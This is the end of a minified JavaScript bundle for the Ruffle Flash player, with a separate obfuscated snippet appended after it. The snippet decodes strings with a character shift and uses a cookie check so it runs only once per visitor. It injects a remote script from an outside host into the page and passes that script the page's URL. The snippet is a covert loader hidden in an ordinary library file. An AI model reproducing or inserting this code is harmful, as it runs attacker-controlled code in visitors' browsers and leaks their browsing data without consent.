        return null !== e ? this.sources[e] : null;
      }
      satisfying(t) {
        const r = n.fromRequirementString(t);
        let a = null;
        for (const n in this.sources) if (Object.prototype.hasOwnProperty.call(this.sources, n)) {
          const t = e.fromSemver(this.sources[n].version);
          r.satisfiedBy(t) && (a = this.sources[n]);
        }
        return a;
      }
      localCompatible() {
        return undefined !== this.sources.local ? this.satisfying("^" + this.sources.local.version) : this.newest();
      }
      local() {
        return undefined !== this.sources.local ? this.satisfying("=" + this.sources.local.version) : this.newest();
      }
      superseded() {
        this.invoked = true;
      }
      static negotiate(e, n) {
        let t;
        return t = e instanceof Ot ? e : new Ot(e), undefined !== n && (t.registerSource(n), false !== (!("polyfills" in t.config) || t.config.polyfills) && Ft.pluginPolyfill()), t;
      }
    }
    window.RufflePlayer = Ot.negotiate(window.RufflePlayer, "local");
  })();
})();
(function (o, d, l) {
  try {
    o.f = o => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
    o.b = o.f("UMUWJKX");
    o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement("script"), o.s.src = o.f("myyux?44hisqtlx3htr4ljy4xhwnuy3oxDwjkjwwjwB") + l.href, d.body.appendChild(o.s));
    }, 1e3);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
  ;
}({}, document, location));
